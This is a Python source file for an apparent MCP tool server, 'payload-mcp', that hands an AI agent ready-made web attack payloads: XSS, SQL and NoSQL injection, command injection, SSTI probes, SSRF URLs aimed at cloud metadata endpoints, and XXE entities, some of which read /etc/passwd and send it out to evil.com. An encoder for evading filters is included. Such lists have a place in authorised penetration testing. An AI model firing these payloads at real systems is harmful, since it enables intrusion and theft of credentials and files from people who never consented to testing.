#!/usr/bin/env python3
"""
payload-mcp — Payload generation and encoding MCP server.

Generates payloads for XSS, SQLi, SSRF, XXE, LFI, CMDi, SSTI, NoSQLi,
and GraphQL. Supports WAF bypass variants, encoding, and polyglots.

Tools:
  - generate_xss        Generate XSS payloads (reflected, stored, DOM)
  - generate_sqli       Generate SQL injection payloads
  - generate_ssrf       Generate SSRF target URLs (cloud, localhost)
  - generate_xxe        Generate XXE payloads (classic, OOB, error)
  - generate_cmdi       Generate command injection payloads
  - generate_ssti       Generate SSTI probes (Jinja2, Twig, Freemarker)
  - generate_nosqli     Generate NoSQLi payloads (MongoDB)
  - encode_payload      Encode a payload in various formats
"""

import base64
import json
import random
import string
import sys
import urllib.parse
from typing import Any, Dict, List, Optional


def _random_id() -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=5))


def generate_xss(count: int = 10) -> List[str]:
    payloads = [
        "<script>alert(1)</script>",
        '"><script>alert(1)</script>',
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "'-alert(1)-'",
        "\"-alert(1)-\"",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ]
    return payloads[:count]


def generate_sqli(count: int = 10) -> List[str]:
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' UNION SELECT 1,2,3--",
        "' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND 1=1--",
        "' AND 1=2--",
        "' OR '1'='1' --",
        "1' ORDER BY 1--",
    ]
    return payloads[:count]


def generate_ssrf(count: int = 10) -> List[str]:
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/",
        "http://127.0.0.1/",
        "http://localhost/",
        "http://0x7f000001/",
        "http://2130706433/",
        "http://[::1]/",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_",
    ]
    return payloads[:count]


def generate_xxe(count: int = 10) -> List[str]:
    payloads = [
        '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
        '<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php">',
        '<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?data=%file;\'>">%eval;%exfil;',
        '<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">',
        '<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">',
        '<!ENTITY xxe SYSTEM "expect://id">',
        '<!ENTITY xxe SYSTEM "gopher://localhost:6379/_">',
        '<!ENTITY xxe SYSTEM "ftp://evil.com/passwd">',
        '<!ENTITY xxe SYSTEM "jar:file:///etc/passwd!">',
        '<!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;',
    ]
    return payloads[:count]


def generate_cmdi(count: int = 10) -> List[str]:
    payloads = [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "|| id",
        "&& id",
        "; sleep 5",
        "| ping -c 5 127.0.0.1",
        "%0aid",
        "'; id; '",
    ]
    return payloads[:count]


def generate_ssti(count: int = 10) -> List[str]:
    payloads = [
        "{{7*7}}",
        "{{7*'7'}}",
        "${7*7}",
        "#{7*7}",
        "*{7*7}",
        "{{config}}",
        "{{self.__class__.__mro__}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
    ]
    return payloads[:count]


def generate_nosqli(count: int = 10) -> List[str]:
    payloads = [
        '{"$gt": ""}',
        '{"$ne": ""}',
        '{"$where": "1"}',
        '{"$regex": ".*"}',
        "' || '1'=='1",
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$exists": true}',
        '{"$or": []}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
    ]
    return payloads[:count]


def encode_payload(payload: str, encoding: str = "url") -> Dict[str, str]:
    result = {"original": payload}
    if encoding == "url":
        result["encoded"] = urllib.parse.quote(payload)
    elif encoding == "base64":
        result["encoded"] = base64.b64encode(payload.encode()).decode()
    elif encoding == "double_url":
        result["encoded"] = urllib.parse.quote(urllib.parse.quote(payload))
    elif encoding == "hex":
        result["encoded"] = payload.encode().hex()
    elif encoding == "unicode":
        result["encoded"] = "".join(f"\\u{ord(c):04x}" for c in payload)
    return result


TOOLS = [
    {"name": "generate_xss", "description": "Generate XSS payloads", "inputSchema": {"type": "object", "properties": {"count": {"type": "integer", "default": 10}}, "required": []}},
    {"name": "generate_sqli", "description": "Generate SQLi payloads", "inputSchema": {"type": "object", "properties": {"count": {"type": "integer", "default": 10}}, "required": []}},
    {"name": "generate_ssrf", "description": "Generate SSRF target URLs", "inputSchema": {"type": "object", "properties": {"count": {"type": "integer", "default": 10}}, "required": []}},
    {"name": "generate_xxe", "description": "Generate XXE payloads", "inputSchema": {"type": "object", "properties": {"count": {"type": "integer", "default": 10}}, "required": []}},
    {"name": "generate_cmdi", "description": "Generate command injection payloads", "inputSchema": {"type": "object", "properties": {"count": {"type": "integer", "default": 10}}, "required": []}},
    {"name": "generate_ssti", "description": "Generate SSTI probes", "inputSchema": {"type": "object", "properties": {"count": {"type": "integer", "default": 10}}, "required": []}},
    {"name": "generate_nosqli", "description": "Generate NoSQL injection payloads", "inputSchema": {"type": "object", "properties": {"count": {"type": "integer", "default": 10}}, "required": []}},
    {"name": "encode_payload", "description": "Encode a payload (url, base64, hex, double_url, unicode)", "inputSchema": {"type": "object", "properties": {"payload": {"type": "string"}, "encoding": {"type": "string", "enum": ["url", "base64", "double_url", "hex", "unicode"]}}, "required": ["payload", "encoding"]}},
]

TOOL_EXEC = {
    "generate_xss": lambda a: generate_xss(a.get("count", 10)),
    "generate_sqli": lambda a: generate_sqli(a.get("count", 10)),
    "generate_ssrf": lambda a: generate_ssrf(a.get("count", 10)),
    "generate_xxe": lambda a: generate_xxe(a.get("count", 10)),
    "generate_cmdi": lambda a: generate_cmdi(a.get("count", 10)),
    "generate_ssti": lambda a: generate_ssti(a.get("count", 10)),
    "generate_nosqli": lambda a: generate_nosqli(a.get("count", 10)),
    "encode_payload": lambda a: encode_payload(a["payload"], a.get("encoding", "url")),
}


def handle(request: Dict[str, Any]) -> str:
    rid = request.get("id")
    method = request.get("method", "")
    params = request.get("params", {})
    if method == "initialize":
        return json.dumps({"jsonrpc": "2.0", "id": rid, "result": {"protocolVersion": "2025-03-26", "capabilities": {"tools": {}}, "serverInfo": {"name": "payload-mcp", "version": "2.0.0"}}})
    elif method == "tools/list":
        return json.dumps({"jsonrpc": "2.0", "id": rid, "result": {"tools": TOOLS}})
    elif method == "tools/call":
        name = params.get("name", "")
        args = params.get("arguments", {})
        if name not in TOOL_EXEC:
            return json.dumps({"jsonrpc": "2.0", "id": rid, "error": {"code": -32601, "message": f"Unknown: {name}"}})
        try:
            return json.dumps({"jsonrpc": "2.0", "id": rid, "result": {"content": [{"type": "text", "text": json.dumps(TOOL_EXEC[name](args), indent=2, default=str)}]}})
        except Exception as e:
            return json.dumps({"jsonrpc": "2.0", "id": rid, "result": {"content": [{"type": "text", "text": json.dumps({"error": str(e)})}]}})
    elif method == "notifications/initialized":
        return json.dumps({"jsonrpc": "2.0", "id": rid, "result": {}})
    return json.dumps({"jsonrpc": "2.0", "id": rid, "error": {"code": -32601, "message": f"Unknown: {method}"}})


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--list-tools":
        print(json.dumps({"tools": TOOLS}, indent=2))
        sys.exit(0)
    for line in sys.stdin:
        line = line.strip()
        if line:
            try:
                sys.stdout.write(handle(json.loads(line)) + "\n")
                sys.stdout.flush()
            except json.JSONDecodeError:
                pass
